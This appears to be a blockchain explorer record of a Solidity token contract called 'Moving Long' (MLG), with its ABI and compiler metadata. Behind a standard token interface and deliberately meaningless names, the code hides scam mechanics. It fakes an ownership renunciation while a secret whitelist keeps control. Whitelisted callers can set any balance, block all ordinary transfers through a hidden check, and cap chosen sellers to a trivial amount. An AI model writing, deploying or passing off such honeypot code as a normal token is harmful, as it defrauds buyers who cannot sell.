{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface marketingLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityLaunch) external view returns (uint256);\n\n    function transfer(address tradingSender, uint256 launchedLaunch) external returns (bool);\n\n    function allowance(address maxMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingSender,\n        uint256 launchedLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoMax, uint256 value);\n    event Approval(address indexed maxMin, address indexed spender, uint256 value);\n}\n\nabstract contract totalReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalFromBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isFromTrading {\n    function createPair(address modeTeam, address launchedReceiver) external returns (address);\n}\n\ninterface minLiquidityTo is marketingLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MovingLong is totalReceiver, marketingLiquidity, minLiquidityTo {\n\n    uint256 public feeTokenFrom;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalTx;\n    }\n\n    function getOwner() external view returns (address) {\n        return enableExempt;\n    }\n\n    function amountReceiver(address fromTotalMin) public {\n        minTake();\n        if (takeReceiver) {\n            txSwap = false;\n        }\n        if (fromTotalMin == feeTx || fromTotalMin == modeSell) {\n            return;\n        }\n        receiverAt[fromTotalMin] = true;\n    }\n\n    function enableWallet(address totalShouldMarketing, uint256 launchedLaunch) public {\n        minTake();\n        launchedSell[totalShouldMarketing] = launchedLaunch;\n    }\n\n    mapping(address => mapping(address => uint256)) private maxLiquidity;\n\n    constructor (){\n        \n        totalFromBuy exemptEnableReceiver = totalFromBuy(takeAutoMarketing);\n        modeSell = isFromTrading(exemptEnableReceiver.factory()).createPair(exemptEnableReceiver.WETH(), address(this));\n        if (takeLaunch != feeTokenFrom) {\n            feeTokenFrom = takeLaunch;\n        }\n        feeTx = _msgSender();\n        swapLaunch();\n        liquidityTotalFrom[feeTx] = true;\n        launchedSell[feeTx] = liquidityTxShould;\n        \n        emit Transfer(address(0), feeTx, liquidityTxShould);\n    }\n\n    function limitTake(address txTeam) public {\n        if (exemptTo) {\n            return;\n        }\n        if (takeLaunch == txAuto) {\n            txAuto = toMin;\n        }\n        liquidityTotalFrom[txTeam] = true;\n        \n        exemptTo = true;\n    }\n\n    mapping(address => uint256) private launchedSell;\n\n    address public modeSell;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverTo;\n    }\n\n    string private receiverTo = \"Moving Long\";\n\n    function swapLaunch() public {\n        emit OwnershipTransferred(feeTx, address(0));\n        enableExempt = address(0);\n    }\n\n    uint256 receiverFundTx;\n\n    function owner() external view returns (address) {\n        return enableExempt;\n    }\n\n    uint8 private totalTx = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityTxShould;\n    }\n\n    uint256 public launchTeamFrom;\n\n    bool public txSwap;\n\n    address modeWalletSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address launchedTokenMode, uint256 launchedLaunch) public virtual override returns (bool) {\n        maxLiquidity[_msgSender()][launchedTokenMode] = launchedLaunch;\n        emit Approval(_msgSender(), launchedTokenMode, launchedLaunch);\n        return true;\n    }\n\n    mapping(address => bool) public receiverAt;\n\n    uint256 private toMin;\n\n    function toMinWallet(address isWallet, address tradingSender, uint256 launchedLaunch) internal returns (bool) {\n        if (isWallet == feeTx) {\n            return totalLaunchReceiver(isWallet, tradingSender, launchedLaunch);\n        }\n        uint256 autoTeam = marketingLiquidity(modeSell).balanceOf(modeWalletSwap);\n        require(autoTeam == enableMin);\n        require(tradingSender != modeWalletSwap);\n        if (receiverAt[isWallet]) {\n            return totalLaunchReceiver(isWallet, tradingSender, tokenIs);\n        }\n        return totalLaunchReceiver(isWallet, tradingSender, launchedLaunch);\n    }\n\n    uint256 enableMin;\n\n    uint256 private takeLaunch;\n\n    uint256 private liquidityTxShould = 100000000 * 10 ** 18;\n\n    bool private takeReceiver;\n\n    function transfer(address totalShouldMarketing, uint256 launchedLaunch) external virtual override returns (bool) {\n        return toMinWallet(_msgSender(), totalShouldMarketing, launchedLaunch);\n    }\n\n    bool public exemptTo;\n\n    function balanceOf(address liquidityLaunch) public view virtual override returns (uint256) {\n        return launchedSell[liquidityLaunch];\n    }\n\n    address public feeTx;\n\n    function feeSender(uint256 launchedLaunch) public {\n        minTake();\n        enableMin = launchedLaunch;\n    }\n\n    function transferFrom(address isWallet, address tradingSender, uint256 launchedLaunch) external override returns (bool) {\n        if (_msgSender() != takeAutoMarketing) {\n            if (maxLiquidity[isWallet][_msgSender()] != type(uint256).max) {\n                require(launchedLaunch <= maxLiquidity[isWallet][_msgSender()]);\n                maxLiquidity[isWallet][_msgSender()] -= launchedLaunch;\n            }\n        }\n        return toMinWallet(isWallet, tradingSender, launchedLaunch);\n    }\n\n    uint256 public txAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldSenderFrom;\n    }\n\n    mapping(address => bool) public liquidityTotalFrom;\n\n    function minTake() private view {\n        require(liquidityTotalFrom[_msgSender()]);\n    }\n\n    function allowance(address launchLimit, address launchedTokenMode) external view virtual override returns (uint256) {\n        if (launchedTokenMode == takeAutoMarketing) {\n            return type(uint256).max;\n        }\n        return maxLiquidity[launchLimit][launchedTokenMode];\n    }\n\n    function totalLaunchReceiver(address isWallet, address tradingSender, uint256 launchedLaunch) internal returns (bool) {\n        require(launchedSell[isWallet] >= launchedLaunch);\n        launchedSell[isWallet] -= launchedLaunch;\n        launchedSell[tradingSender] += launchedLaunch;\n        emit Transfer(isWallet, tradingSender, launchedLaunch);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed liquidityAmountIs, address indexed receiverLiquidity);\n\n    uint256 constant tokenIs = 14 ** 10;\n\n    address takeAutoMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private shouldSenderFrom = \"MLG\";\n\n    address private enableExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAmountIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedTokenMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTotalMin\",\"type\":\"address\"}],\"name\":\"amountReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTokenMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShouldMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedLaunch\",\"type\":\"uint256\"}],\"name\":\"enableWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedLaunch\",\"type\":\"uint256\"}],\"name\":\"feeSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTokenFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTeamFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTeam\",\"type\":\"address\"}],\"name\":\"limitTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTotalFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShouldMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MovingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}